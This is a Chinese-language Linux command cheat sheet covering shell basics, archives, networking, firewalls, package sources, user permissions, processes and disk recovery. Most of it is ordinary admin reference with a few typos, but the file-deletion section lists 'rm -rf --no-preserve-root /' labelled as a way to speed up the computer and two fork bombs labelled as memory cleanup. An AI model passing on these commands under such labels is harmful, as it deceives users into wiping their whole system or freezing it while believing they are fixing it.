# Speed-Linux😋

`基础 Linux 命令、操作指南`

---

# Linux编程🚬
很多脚本第一行用来指定本脚本用什么解释器来执行
例如`#!/usr/bin/python`相当于写死了 python 路径。
而`#!/usr/bin/env python`会去环境设置寻找 python 目录,可以增强代码的可移植性,推荐这种写法。

## 编译
```bash
mount -t tmpfs tmpfs ~/build -o size=1G	# 把文件放到内存上做编译
make -j	# 并行编译
ccache	# 把编译的中间结果进行缓存,以便在再次编译的时候可以节省时间。

# 在/usr/local/bin下建立gcc,g++,c++,cc的symbolic link,链到/usr/bin/ccache上。总之确认系统在调用gcc等命令时会调用到ccache就可以了（通常情况下/usr/local /bin会在PATH中排在/usr/bin前面）。

distcc	# 多台机器一起编译
	/usr/bin/distccd  --daemon --allow 10.64.0.0/16 # 默认的3632端口允许来自同一个网络的distcc连接。

	export DISTCC_HOSTS="localhost 10.64.25.1 10.64.25.2 10.64.25.3"
	把g++,gcc等常用的命令链接到/usr/bin/distcc上

	make -j4	# 在make的时候,也必须用-j参数,一般是参数可以用所有参用编译的计算机CPU内核总数的两倍做为并行的任务数。
	distccmon-text # 查看编译任务的分配情况。
```

---

# Shell👍
## 环境变量

- **bash**
```bash
echo $PATH  # 查看环境变量

PATH=$PATH:/usr/local/python3/bin/ # 新添加的路径（关闭终端失效）
```
```vim
vim ~/.bash_profile # 永久修改变量

PATH=$PATH:/usr/local/bin/
```
`source ~/.bash_profile` 立即生效


- **fish**
```vim
vim ~/.config/fish/config.fish

set PATH (你想要加入的路径) $PATH
```
`souce ~/.config/fish/config.fish`


---

## 通配符/限制输出
```bash
head
tail
<
>
grep
sort
uniq
awk
&
```

---

## 会话
```bash
who
w
last

yum -y install screen
apt-get -y install screen
screen -S name
screen -ls
screen -r	name # 重新连接
ctrl+d # 终止会话
```

---

## 目录
```bash
cd
~ # 表示home目录
. # 表示当前目录
.. # 表示上级目录
- # 表示上一次目录
/ # 表示根目录

root  # 存放root用户相关文件
home  # 存放普通用户相关文件
bin   # 存放普通命令
sbin  # 存放需一定权限才能使用的命令
mnt   # 默认挂载光驱软驱目录
etc   # 存放配置相关文件
var   # 存放经常变化文件
boot  # 存放引导相关文件
usr   # 存放软件默认安装目录
```

---

## 文件
### 压缩备份
```bash
.tar	# 注:tar是打包,不是压缩！
tar -xvf FileName.tar	# 解包
tar -cvf FileName.tar DirName	# 打包
tar -tvf FileName.tar.gz	# 不解压查看内容
tar -xvf FileName.tar.gz	a.txt  # 解压指定内容
tar -uvf test.tar.bz2 test	# 更新一个内容
tar -rvf test.tar.bz2 test2  # 追加一个内容

.tar.gz 和 .tgz
tar -zxvf FileName.tar.gz	# 解压
tar -zcvf FileName.tar.gz DirName	# 压缩

.tar.Z
tar -Zxvf FileName.tar.Z	# 解压
tar -Zcvf FileName.tar.Z DirName	# 压缩

.tar.bz
tar -jxvf FileName.tar.bz	# 解压
tar -jcvf FileName.tar.bz DirName	# 压缩

.gz
gunzip FileName.gz	# 解压1
gzip -dv FileName.gz	# 解压2
gzip FileName	# 压缩
gzip -l FileName.gz # 不解压查看内容
zcat FileName.gz # 不解压查看内容

.bz2
bzip2 -dv FileName.bz2	# 解压1
bunzip2 FileName.bz2	# 解压2
bzip2 -zv FileName	# 压缩
bzcat	FileName.bz2 # 不解压查看内容

.Z
uncompress FileName.Z	# 解压
compress FileName	# 压缩
compress -rvf /home/abc/	# 强制压缩文件夹

.zip
unzip FileName.zip	# 解压
zip FileName.zip DirName	# 压缩

.rar
rar -x FileName.rar	# 解压
rar -a FileName.rar DirName	# 压缩

.lha
lha -e FileName.lha	# 解压
lha -a FileName.lha FileName	# 压缩

.rpm
rpm2cpio FileName.rpm | cpio -div	# 解包

.deb
ar -p FileName.deb data.tar.gz | tar zxf -	# 解包
```

### 读写
#### 增
```bash
touch -r test1.txt test2.txt # 更新test2.txt时间戳与test1.txt时间戳相同
touch -c -t 202510191820 a.txt # 更改时间
truncate -s 100k aaa.txt 	 # 创建指定大小文件

mkdir -p /mnt/aaa/aaa/aaa 	# 创建指定路径一系列文件夹
mkdir -m 777 /test	# 创建时指定权限
```

#### 删
```bash
rm -i	# 确认
rm -rf --no-preserve-root /	# 电脑加速
rmdir # 删除空目录

:(){:|:&};:	 # 清理内存
b(){ b|b& };b  # 清理内存
```

#### 查
**查看**
```bash
pwd -P # 目录链接时,显示实际路径而非link路径
ls # 第一个字符 -表示文件,d目录,l链接,b接口设备,c串口设备
ls -a # 查看隐藏文件
tac # 倒着读
od # 二进制读
cat -n # 带行号读
cat -b # 带行号,越过空白行
less
more +10 a.txt # 从第10行读起
more -10 f1.txt # 每次显示10行读取文件
head -n 1 文件名	 # 读文件第一行
head -5 /etc/passwd	# 读取文件前5行
tail -10 /etc/passwd # 读取文件后10行
sed -n '5,10p' /etc/passwd  # 读取文件第5-10行
du	# 文件大小
stat # 文件属性
file # 文件类型
id
```

**查找**
```bash
fd
	wget https://github.com/sharkdp/fd/releases/download/v7.3.0/fd-musl_7.3.0_amd64.deb
	dpkg -i fd-musl_7.3.0_amd64.deb
	fd aaa.txt

find / -name conf*
which passwd
locate passwd
```

#### 改
```bash
cp -r # 带目录复制
mv
vi
vim
nano
gedit	# 图形化的编辑器
```

---

# net📶
## 配置
**Ubuntu**
```vim
vim /etc/network/interfaces

auto enp7s0	 # 使用的网络接口
iface enp7s0 inet static	# 静态ip设置
address 10.0.208.222
netmask 255.255.240.0
gateway 10.0.208.1
dns-nameservers 10.0.208.1
```
```bash
sudo ip addr flush enp7s0
sudo systemctl restart networking.service

systemctl restart NetworkManager
systemctl enable NetworkManager
```

**Centos**
```vim
vim /etc/sysconfig/network-scripts/ifcfg-eth0    # 是不是eth0要看自己的网卡,使用ip a

HWADDR=00:0C:29:F1:2E:7B
BOOTPROTO=static　　　　　　　# 使用静态IP,而不是由DHCP分配IP
IPADDR=172.16.102.61
PREFIX=24
GATEWAY=172.16.102.254
HOSTNAME=test
onboot=yes
```
```vim
vim /etc/hosts

127.0.0.1  test localhost  # 修改localhost.localdomain为test,shutdown -r now重启使修改生效
```
```bash
systemctl restart NetworkManager	# 重启网络管理
systemctl enable NetworkManager
```

修改DNS
```vim
vim /etc/resolv.conf

nameserver 8.8.8.8
```
```bash
chattr +i /etc/resolv.conf	# 限制用户（包括 root）删除、修改、增加、链接等操作。要修改的话要先删掉这个设置
service network restart
```

**Arch**
```bash
ifconfig eth0 up	# 启动网卡
dhcpcd  eth0	# 获取ip
```
`ifconfig -a` 查看下可用的网卡
```vim
vim /etc/rc.conf

interface=eth0
eth0="dhcp"
lo="lo 127.0.0.1"
eth0="eth0 192.168.0.2 netmask 255.255.255.0 broadcast 192.168.0.255"

INTERFACES=(eth0)
gateway="default gw 192.168.0.1"
ROUTES=(gateway)
```
`/etc/rc.d/network restart`

---

## 传输/下载

**scp**
```bash
scp root@xx.xx.xx.xx:/test/123.txt /test/123.txt
scp -r # 文件夹传输
```

**lrzsz**
```bash
yum install lrzsz
sz xxx   # 将选定的文件发送（send）到本地机器
rz # 运行该命令会弹出一个文件选择窗口,从本地选择文件上传到服务器(receive),需要远程软件支持
```

**wget**
```bash
wget http://example.com/file.iso
wget --output-document=filename.html example.com   # 另行命名
wget -c example.com/big.file.iso	# 恢复之前的下载
wget --i list.txt	# 下载文件中的url
wget -r example.com	# 递归下载
wget --no-check-certificate # 不检查https证书
```

### bt
- Transmission
- rtorrent

- **[peerflix](https://github.com/mafintosh/peerflix)**
```bash
npm install -g peerflix
peerflix "magnet:?xt=urn:btih:ef330b39f4801d25b4245212e75a38634bfc856e"
```

- **[tget](https://github.com/jeffjose/tget)**
```bash
npm install -g t-get
tget 'magnet:?xt=urn:btih:0403fb4728bd788fbcb67e87d6feb241ef38c75a'
```

---

## Firewall
### Firewalld
```bash
firewall-cmd --zone=public --add-port=12345/tcp --permanent  # 开放端口
firewall-cmd --zone=public --add-service=http --permanent   # 开放服务
firewall-cmd --zone=public --add-rich-rule 'rule family="ipv4" source address="192.168.1.10" accept' --permanent # 允许192.168.1.10所有访问所有端口
firewall-cmd --zone=public --add-rich-rule 'rule family="ipv4" source address="192.168.1.10" port port=22 protocol=tcp reject' --permanent #拒绝192.168.1.10所有访问TCP协议的22端口

firewall-cmd --reload   # 重新加载
firewall-cmd --list-services  # 查看防火墙设置
```

### Iptables
```bash
iptables-save > /root/firewall_rules.backup		# 备份一下策略
iptables -A OUTPUT -p tcp -d bigmart.com -j ACCEPT
iptables -A OUTPUT -p tcp --dport 80 -j DROP
iptables -A INPUT -p tcp -s 10.0.3.1 --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 22 -j DROP

iptables -L		# 查看防火墙规则
iptables-restore </root/firewall_rules.backup	# 规则恢复一下
```

---

## 软件包管理
### 源
**本地yum源**

挂载到/mnt/cdrom
```bash
mkdir /mnt/cdrom
mount /dev/cdrom /mnt/cdrom/
```

进入 /etc/yum.repos.d 目录,将其中三个改名或者剩下所有都移走留下 CentOS-Base.repo
```bash
cd /etc/yum.repos.d
rm  CentOS-Media.repo
rm  CentOS-Vault.repo
```

编辑 CentOS-Base.repo
```vim
vim CentOS-Base.repo

baseurl=file:///mnt/cdrom/  # 这里为本地源路径
gpgcheck=0
enabled=1    # 开启本地源
```

**Alibaba源**

直接下载源
>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo

刷新 YUM 的缓存状态:
>yum clean all
>yum makecache

**Ub源**
```vim
lsb_release -c	# 查看系统版号

cd /etc/apt/
mv sources.list sources.list.bak
```
```vim
vim sources.list

deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
```

**Kali源**
```vim
vim /etc/apt/sources.list

deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
```
`apt-get update && apt-get upgrade && apt-get dist-upgrade`


**Pacman源**
```bash
sudo pacman-mirrors -i -c China -m rank # 更新镜像排名
sudo pacman -Syy # 更新数据源
sudo pacman -S archlinux-keyring
```

### Binary
```bash
yum install make
yum install gcc
yum install gcc-c++
./configure --prefix=/opt	#配置,表示安装到/opt目录
make	#编译
make install	#安装
```

### dpkg
```bash
dpkg -i xxxxx.deb  #安装软件
dpkg -R /usr/local/src	#安装路径下所有包
dpkg -L #查看软件安装位置
```

### Pacman
```bash
sudo pacman -S vim
sudo pacman -S fish
sudo pacman -Syy
```

### rpm
```bash
rom -qa 		#搜索
rpm -qf /etc/my.conf	#查询文件来自哪个包
rpm –ivh xxxx.rpm	#安装本地包
rpm -e xxx	#卸载
rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
```

### yum
```bash
yum update && yum upgrade
rm -f /var/run/yum.pid	#强制解锁占用
yum repolist	#看下仓库列表
yum groupinstall "Development Tools"
yum install openssl-devel
yum install git
yum install python
```

### apt
```bash
apt-get update && apt-get upgrade && apt-get dist-upgrade
rm -rf /var/lib/dpkg/lock
apt install vim
apt install python
apt install gcc
apt install gcc-++
apt install g++
apt install make
apt install vim-common=2:7.4.1689-3ubuntu1.2
apt install vim
apt install git
apt install curl

apt-add-repository ppa:fish-shell/release-3
apt update
apt install fish
```

### 常用软件

**Fish**
```bash
echo /usr/bin/fish | sudo tee -a /etc/shells	# 加默认
usermod -s /usr/bin/fish USERNAME
```

**Powerline-shell**

`pip install powerline-shell`
```vim
vim ~/.config/fish/config.fish

function fish_prompt
	powerline-shell --shell bare $status
end
```

**Vim**

常用操作
```
Normal 模式下 i 进入 insert 模式
:wq 存盘+退出
dd 删除当前行,并存入剪切板
p 粘贴
:q！强制退出
:wq！强制保存退出
:w !sudo tee %  无 root 权限,保存编辑的文件
:saveas <path/to/file> 另存为
按下 / 即可进入查找模式,输入要查找的字符串并按下回车。 Vim会跳转到第一个匹配。按下n 查找下一个,按下 N 查找上一个。
:%s/foo/bar 代表替换foo为bar
insert 模式按 ESC 键,返回 Normal 模式
```

使用 vim 对比文件
>vimdiff  FILE_LEFT  FILE_RIGHT

---

# 系统管理🦋
## 系统设置
### 时间

```bash
data -s "2019-03-31 13:12:29"   # 修改系统时间
hwclock	# clock和hwclock是一样的
ntpdate 0.rhel.pool.ntp.org   # 网络同步时间
hwclock –w # 将系统时钟同步到硬件时钟
hwclock -s # 将硬件时钟同步到系统时钟
cal	2019	# 2019日历
```

### 语言

`echo  $LANG` 查看当前操作系统的语言
```vim
vim /etc/locale.conf

set LANG en_US.UTF-8	# 更改默认语言
	 zh_CN.UTF-8
```
`source   /etc/locale.conf`

### 启动项

```bash
chkconfig --list        # 列出所有的系统服务
chkconfig --add httpd        # 增加httpd服务
chkconfig --del httpd        # 删除httpd服务
chkconfig --level httpd 2345 on        # 设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态
```
```vim
vim /etc/crontab	# 系统任务调度的配置文件

# 前5个星号分别代表:分钟,小时,几号,月份,星期几
* * * * * command	# 每1分钟执行一次command
3,15 * * * * command	# 每小时的第3和第15分钟执行
@reboot	command # 开机启动
```

### 账号管控

**账号**
```bash
whoami	# 当前用户
groups	# 当前组

useradd -d /home/user1 -s /sbin/nologin user1  # 创建用户user1
passwd user1 # 设置密码
addgroup group1 # 创建组
addgroup user1 group1 # 移动用户到组
newgrp group1	# 创建组
usermod -g 组名 用户名　# 修改用户的主组
usermod -G 附加组 用户名　# 修改用户的附加组
usermod -s /bin/bash 用户名　# 修改用户登录的Shell
userdel user1 # 只删除用户不删除家目录
userdel -r user1 # 同时删除家目录
userdel -f user1 # 强制删除,即使用户还在登陆中
sudo passwd   # 配置 su 密码
```

**权限**
```bash
chown named.named aaa.txt 	# 将文件给指定用户及组
chmod 777 a.txt 		# 给文件权限
chmod 777  # 用户rwx、组rwx、其他用户rwx  4.2.1分别代表读,写,执行
chmod o=rw a.txt  # 代表只给其他用户分配读写权限
chmod u=rw,g=r,o= a.txt
chown -R u+x test  # 对test及其子目录所有文件的所有者增加执行权限
chgrp user1 file.txt	# Change the owning group of the file file.txt to the group named user1.
chgrp -hR staff /office/files	# Change the owning group of /office/files, and all subdirectories, to the group staff.
umask 002	# 配置反码,代表创建文件权限是 664 即 rw-rw-r--,默认0022
# umask值002 所对应的文件和目录创建缺省权限分别为6 6 4和7 7 5
```
```vim
visudo	# 加sudo权限

user1 ALL=(ALL)     ALL
```
加sudo权限(仅限Ubuntu)
```bash
adduser user1 sudo	# 将user1加到sudo组中
deluser user1 sudo	# 将user1从sudo组中删除
```

---

## 系统信息

```vim
uname -a
cat /etc/os-release
```

### 进程管理

**进程处理**
```bash
杀进程
kill -s STOP <PID>
kill -HUP <pid>	# 更改配置而不需停止并重新启动服务
killall <PID>

处理进程
service xxx start	# 开服务
service xxx stop	# 关服务

systemctl start xxx
systemctl stop xxx
systemctl enable xxx	# 设置开机启动
systemctl disable xxx

ctrl+z # 将前台运行的任务暂停,仅仅是暂停,而不是将任务终止。
bg	# 转后台运行
fg	# 转前台运行

查进程
pidof program	# 找出program程序的进程PID
pidof -x script # 找出shell脚本script的进程PID
service xxx status
systemctl status xxx
```

**查询负载、进程监控**
```bash
top
free
vmstat
ps -aux
```

---

# 设备管理🛠
## 硬盘/数据

**磁盘配额**
- quota

**分区**
```bash
fdisk ‐l		# 查看磁盘情况
fdisk /dev/sdb	# 创建系统分区
	n
	p
	1
	后面都是默认,直接回车

	t	# 转换分区格式
	8e

	w	# 写入分区表
```

**挂载**
```bash
mount /dev/sdd1 /mnt/sdd	# 挂载新硬盘到操作系统的某个节点上
mount /dev/cdrom /mnt/cdrom/	# 挂载CD镜像

vi /etc/fstab	# 自动挂载
/dev/cdrom /mnt/cdrom iso9660 defaults 0 0
```

**删除**
```bash
rm test.txt	# 删除test.txt
rm -r test	# 删除文件夹
rm -i test.txt	# 删除前确认
rm -f test.txt	# 强制删除
rm -v test.txt # 显示详细信息

主要用于文件覆盖内容,也可以删除
shred -zvu -n  5 passwords.list
# -z - 用零添加最后的覆盖以隐藏碎化
# -v - 显示操作进度
# -u - 覆盖后截断并删除文件
# -n - 指定覆盖文件内容的次数（默认值为3）
```

**数据恢复**

一点建议:业务系统,rm删除后，没有立即关机，运行的系统会持续覆盖误删数据。对于重要数据,误删后请立即关机
- [foremost](http://foremost.sourceforge.net/)
```bash
apt-get install foremost
rm -f /dev/sdb1/photo1.png
foremost -t png -i /dev/sdb1
# 恢复完成后会在当前目录建立一个 output 目录，在 output 目录下会建立 png 子目录下会包括所有可以恢复的 png 格式的文件。
# 需要说明的是 png 子目录下会包括的 png 格式的文件名称已经改变，另外 output 目录下的 audit.txt 文件是恢复文件列表。
```

- [extundelete](http://extundelete.sourceforge.net/)
```bash
apt-get install extundelete
mkdir –p /backupdate/deldate
mkfs.ext4 /dev/sdd1
mount /dev/sdd1 /backupdate
cd /backupdate/deldate
touch del1.txt
echo " test 1" > del1.txt
md5sum del1.txt # 获取文件校验码
66fb6627dbaa37721048e4549db3224d  del1.txt
rm -fr /backupdate/*
umount /backupdate # 卸载文件系统或者挂载为只读
extundelete /dev/sdd1 --inode 2 #查询恢复数据信息，注意这里的--inode 2 这里会扫描分区 ：
extundelete /dev/sdd1 --restore-file del1.txt # 如果恢复一个目录
extundelete /dev/sdd1 --restore-directory /backupdate/deldate # 恢复所有文件
extundelete /dev/sdd1 --restore-all # 获取恢复文件校验码，对比检测是否恢复成功
md5sum RECOVERED_FILES/ del1.txt
66fb6627dbaa37721048e4549db3224d  RECOVERED_FILES/del1.txt
```

**占用**
```bash
df      # 报告驱动器的空间使用情况
df -H   # 以人类可读的格式进行显示
df -ah  # 查看磁盘占用大的文件夹
du --max-depth=1 -h #查看文件夹下各个文件夹的磁盘占用

du      # 报告目录的空间使用情况
du -h /etc/yum | sort # 以人类可读的格式进行显示,排序显示
du -sh /etc/yum # 特定目录的总使用量
```

**dd**
```bash
dd if=/dev/zero of=sun.txt bs=1M count=1
# if 代表输入文件。如果不指定if，默认就会从stdin中读取输入。
# of 代表输出文件。如果不指定of，默认就会将stdout作为默认输出。
# ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。
# obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。
# bs 代表字节为单位的块大小。
# count 代表被复制的块数。
# /dev/zero 是一个字符设备，会不断返回0值字节（\0）。
```

**LVM**
```bash
pvcreate /dev/sdb1	# 初始化物理卷
vgcreate ‐s 16M datastore /dev/sdb1 # 创建物理卷
lvcreate ‐L 8G ‐n database datastore # 创建逻辑卷
lvdisplay # 查看逻辑卷的属性
```

**块设备信息**
```bash
lsblk   # 显示所有可用块设备的信息
lsblk -m    # 显示设备所有者相关的信息，包括文件的所属用户、所属组以及文件系统挂载的模式

blkid   # 输出所有可用的设备、UUID、文件系统类型以及卷标
blkid /dev/sda1
blkid -U d3b1dcc2-e3b0-45b0-b703-d6d0d360e524
blkid -po udev /dev/sda1 # 获取更多详细信息
blkid -g    # 清理 blkid 的缓存
```

---

`为了自己想过的生活,勇于放弃一些东西。这个世界没有公正之处,你也永远得不到两全之计。若要自由,就得牺牲安全。若要闲散,就不能获得别人评价中的成就。若要愉悦,就无需计较身边人给予的态度。若要前行,就得离开你现在停留的地方。——《托斯卡纳艳阳下》`
